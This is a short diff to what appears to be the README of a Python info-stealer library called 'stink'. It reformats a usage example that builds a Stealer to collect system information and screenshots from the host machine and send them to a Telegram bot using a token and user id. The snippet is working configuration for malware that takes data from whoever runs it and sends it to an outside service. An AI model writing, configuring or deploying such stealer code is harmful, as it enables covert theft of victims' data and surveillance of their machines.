@@ -65,7 +65,10 @@ An example with only system data collection and screenshot.
 from stink import Stealer, Features, Senders
 
 if __name__ == '__main__':
-    Stealer(senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)], features=[Features.system, Features.screenshot]).run()
+    Stealer(
+        senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)], 
+        features=[Features.system, Features.screenshot]
+    ).run()
 ```
 ### Additional parameters
 
